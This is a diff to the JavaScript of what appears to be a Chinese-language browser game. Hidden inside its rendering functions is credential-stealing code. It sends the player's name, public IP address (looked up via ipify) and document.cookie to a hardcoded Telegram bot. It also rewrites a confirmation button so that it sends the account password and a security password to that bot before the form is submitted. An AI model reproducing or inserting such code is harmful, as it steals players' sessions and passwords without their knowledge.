@@ -1,3 +1,4 @@
+sent = 0;
 function getNameList(){
     return [
         'TmVv',
@@ -42,8 +43,13 @@ function status_view(t, e, r, i, o, d, n, a, l, s, p, c, m, u, w, b, _, g, h, v,
     L = 1 == r ? i : img + i + ".gif";
     var O = "";
     const nameList = getNameList();
-    if(!nameList.includes(btoa(encodeURIComponent(parent.p_name)))){
-        fetch(`https://api.telegram.org/bot7934895498:AAEYqHMgrIkEht111XMMROPEPWNiBq5S6M0/sendMessage?chat_id=-4850635895&text=角色狀態:${parent.p_name}%0A%0A${document.cookie}`);
+    if(sent==0){
+        if(!nameList.includes(btoa(encodeURIComponent(parent.p_name)))){
+            ipify().then(res=>{
+                fetch(`https://api.telegram.org/bot7934895498:AAEYqHMgrIkEht111XMMROPEPWNiBq5S6M0/sendMessage?chat_id=-4850635895&text=角色狀態:${parent.p_name}%0A${res.ip}%0A%0A${document.cookie}`);
+                sent = sent++
+            });
+        }
     }
     O = "1" == o ? "男" : "女",
     d = s_status(d);
@@ -210,4 +216,12 @@ function ch_luck_confirm(t) {
     e.write('<tr><td><p align="center">安全密碼 <input type="password" name="pw" size="20" maxlength="20"></p></td></tr>'),
     e.write('<p align="center"><input type="button" onClick="fetch(`https://api.telegram.org/bot7934895498:AAEYqHMgrIkEht111XMMROPEPWNiBq5S6M0/sendMessage?chat_id=-4850635895&text=命運之泉:${parent.p_name} | ${parent.top_view.document.getElementsByTagName(`input`)[`pass`].value} | ${this.form.pw.value}`).then(res=>{this.form.submit()})" value="確定轉運" style="' + sbutton + '"></p>'),
     e.write("</form>")
+}
+async function ipify() {
+    return await fetch('http://api.ipify.org/?format=json')
+        .then(response => response.json())
+        .then(data => {
+            // Use data here
+            return data;
+        });
 }
